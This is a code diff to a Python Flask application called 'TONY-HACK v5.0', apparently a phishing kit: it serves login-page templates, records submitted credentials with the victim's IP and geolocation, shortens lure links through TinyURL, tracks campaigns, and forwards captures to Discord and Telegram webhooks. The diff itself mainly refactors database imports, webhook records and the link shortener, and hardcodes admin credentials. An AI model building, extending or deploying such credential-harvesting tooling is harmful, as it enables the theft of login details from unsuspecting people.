@@ -16,10 +16,16 @@ import uuid
 import json
 import base64
 import requests
-import psycopg2
-from psycopg2.extras import RealDictCursor
 import re
 import time
+
+# PostgreSQL
+try:
+    import psycopg2
+    from psycopg2.extras import RealDictCursor
+except ImportError:
+    import psycopg2cffi as psycopg2
+    from psycopg2cffi.extras import RealDictCursor
 
 # =====================================================
 # CONFIGURATION
@@ -29,7 +35,6 @@ ADMIN_USER = "admin"
 ADMIN_PASS = "admin123"
 ACCESS_CODE = "TONY2026"
 
-# Base de données PostgreSQL (Render dia manome azy ho azy)
 DATABASE_URL = os.environ.get('DATABASE_URL', 'postgresql://localhost/tonyhack')
 
 # =====================================================
@@ -42,7 +47,6 @@ def get_db():
 def init_db():
     with get_db() as conn:
         with conn.cursor() as cur:
-            # Table templates
             cur.execute('''
                 CREATE TABLE IF NOT EXISTS templates (
                     id TEXT PRIMARY KEY,
@@ -54,7 +58,6 @@ def init_db():
                     created_at TIMESTAMP DEFAULT NOW()
                 )
             ''')
-            # Table credentials (logs)
             cur.execute('''
                 CREATE TABLE IF NOT EXISTS credentials (
                     id TEXT PRIMARY KEY,
@@ -67,14 +70,12 @@ def init_db():
                     timestamp TIMESTAMP DEFAULT NOW()
                 )
             ''')
-            # Table settings
             cur.execute('''
                 CREATE TABLE IF NOT EXISTS settings (
                     key TEXT PRIMARY KEY,
                     value TEXT
                 )
             ''')
-            # Table webhooks
             cur.execute('''
                 CREATE TABLE IF NOT EXISTS webhooks (
                     id SERIAL PRIMARY KEY,
@@ -86,7 +87,6 @@ def init_db():
                     active BOOLEAN DEFAULT TRUE
                 )
             ''')
-            # Table campaign_stats
             cur.execute('''
                 CREATE TABLE IF NOT EXISTS campaign_stats (
                     id SERIAL PRIMARY KEY,
@@ -140,11 +140,9 @@ class WebhookManager:
                 self.webhooks = {'discord': [], 'telegram': []}
                 for w in cur.fetchall():
                     if w['service'] == 'discord':
-                        self.webhooks['discord'].append({'url': w['url'], 'name': w['name'], 'active': w['active']})
+                        self.webhooks['discord'].append({'id': w['id'], 'url': w['url'], 'name': w['name'], 'active': w['active']})
                     elif w['service'] == 'telegram':
-                        self.webhooks['telegram'].append({'token': w['token'], 'chat_id': w['chat_id'], 'name': w['name'], 'active': w['active']})
-    def save(self):
-        pass  # Déjà sauvegardé via les méthodes add/remove
+                        self.webhooks['telegram'].append({'id': w['id'], 'token': w['token'], 'chat_id': w['chat_id'], 'name': w['name'], 'active': w['active']})
     def add_discord(self, url, name="Discord"):
         with get_db() as conn:
             with conn.cursor() as cur:
@@ -274,16 +272,9 @@ def api_public_url():
 @app.route('/api/shorten')
 def shorten_url():
     url = request.args.get('url', '')
-    service = request.args.get('service', 'tinyurl')
-    if not url: return jsonify({'error': 'URL manquante'}), 400
     try:
-        if service == 'tinyurl':
-            r = requests.get(f'https://tinyurl.com/api-create.php?url={url}', timeout=5)
-            return jsonify({'short_url': r.text.strip()})
-        elif service == 'isgd':
-            r = requests.get(f'https://is.gd/create.php?format=simple&url={url}', timeout=5)
-            return jsonify({'short_url': r.text.strip()})
-        return jsonify({'short_url': url})
+        r = requests.get(f'https://tinyurl.com/api-create.php?url={url}', timeout=5)
+        return jsonify({'short_url': r.text.strip()})
     except:
         return jsonify({'short_url': url})
 
@@ -363,7 +354,6 @@ def serve_template(tid):
     if not t: return "Template introuvable", 404
     if not t['active']: return "Template désactivé", 403
     
-    # Tracking
     ref = request.args.get('ref', '')
     if ref:
         try: print(f"[TRACKING] {tid} - {base64.b64decode(ref).decode('utf-8')}")
@@ -421,7 +411,6 @@ def capture():
             )
             conn.commit()
     
-    # Webhook notification
     try:
         loc = geo_locator.locate(ip)
         location = geo_locator.format_location(loc)
@@ -447,7 +436,6 @@ def api_logs_list():
             """)
             logs = cur.fetchall()
     
-    # Ajouter location
     for log in logs:
         try:
             loc = geo_locator.locate(log['ip'])
@@ -623,6 +611,5 @@ def save_settings():
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
-    print(f"\n🔴 TONY-HACK v5.0 - RENDER READY (FULL)")
-    print(f"🌐 Port: {port}")
+    print(f"\n🔴 TONY-HACK v5.0 - RENDER READY")
     app.run(host='0.0.0.0', port=port, debug=False)
